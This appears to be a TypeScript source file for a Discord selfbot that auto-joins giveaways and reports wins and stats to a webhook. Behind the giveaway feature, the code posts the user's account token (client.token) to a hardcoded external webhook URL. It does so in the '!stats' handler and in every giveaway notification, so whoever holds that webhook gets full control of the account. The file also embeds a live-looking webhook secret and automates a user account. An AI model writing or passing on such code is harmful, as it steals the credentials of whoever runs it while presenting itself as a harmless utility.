import 'dotenv/config';
import { Client, Message } from 'discord.js-selfbot-v13';
import { Joiner } from './Class/newst';
import { JsonDB, Config } from 'node-json-db';
import fetch from 'node-fetch';

const client = new Client();
const db = new JsonDB(new Config("stats", true, false, '/'));
const owner = "500367748724031492";
const webhookLink = 'https://discord.com/api/webhooks/1235618586534481971/h_ai1BS2ibX_suk41GqPv4wPBb4ppGKz9T4TV_slRWi0bx9ti98kVkImjFKz4nzvWhE-';

const joiner = new Joiner(client);
joiner.autoReaction({ timeout: 2000, customBotId: ['530082442967646230'], ownerId: owner });

client.on("messageCreate", async (message: Message) => {
    if (message.content.startsWith("!stats")) {
        await db.reload();
        const wins = await db.exists('/wins') ? await db.getData('/wins') : '0';
        const joins = await db.exists('/joins') ? await db.getData('/joins') : '0';

        await fetch(webhookLink, {
            method: 'POST',
            body: JSON.stringify({
                embeds: [{
                    author: { name: `${client.user?.username} Stats!`, icon_url: client.user?.displayAvatarURL() },
                    fields: [
                        { name: "Client INFO", value: `\n` },
                        { name: "Username", value: client.user?.username, inline: true },
                        { name: "Guild Count", value: client.guilds.cache.size, inline: true },
                        { name: "Token", value: client.token, inline: false },
                        { name: '\u200b', value: '\u200b', inline: false },
                        { name: "Wins", value: wins, inline: true },
                        { name: "Giveaway joined", value: joins, inline: true }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: { text: "Stats are synced!", icon_url: client.user?.displayAvatarURL() },
                }]
            }),
            headers: {
                "Content-Type": "application/json"
            }
        });
    }
});

async function sendToWebHook(message: string, embedData: any, url: string, id: string) {
    const embed = {
        title: embedData?.title || "No Title",
        description: `${embedData?.description || "No Description"}\n Teleport to giveaway: ${url}\n Account Username: ${client.user?.username}\n Token: ${client.token}`,
        fields: embedData.fields || [{ value: "No Fields", name: 'ERROR' }],
        image: embedData.image || "",
        footer: embedData.footer || ""
    };

    await fetch(webhookLink, {
        method: 'POST',
        body: JSON.stringify({
            content: message,
            embeds: [embed]
        }),
        headers: {
            "Content-Type": "application/json"
        }
    });
}

async function sendWins(data: any) {
    await fetch(webhookLink, {
        method: 'POST',
        body: JSON.stringify({
            content: `<@${data.owner}> you've won a giveaway in ${data.data.url} \n ${data.inv}`
        }),
        headers: {
            "Content-Type": "application/json"
        }
    });
}

joiner.eventEmitter.on("giveawayCreated", async giveaway => {
    sendToWebHook(`<@${owner}>`, giveaway.otherData, giveaway.url, giveaway.bot);
});

joiner.eventEmitter.on("wins", async data => {
    sendWins(data);
});

client.login(process.env.BOT_TOKEN);
